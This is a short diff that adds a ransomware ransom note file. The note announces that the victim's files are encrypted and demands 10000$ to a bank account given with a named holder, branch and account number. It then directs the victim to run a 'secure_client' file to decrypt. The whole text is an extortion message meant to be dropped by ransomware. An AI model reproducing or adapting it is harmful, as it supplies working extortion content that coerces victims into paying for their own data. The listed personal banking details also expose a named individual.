@@ -1,0 +1,7 @@
+All your files have been encrypted. 
+To decrypt them, transfer 10000$ to the bank account:
+    Name: Itay Baruch
+    Branch Number: 556
+    Account Number: 445789
+    
+After transfering the money, run the secure_client file in order to decrypt them. 
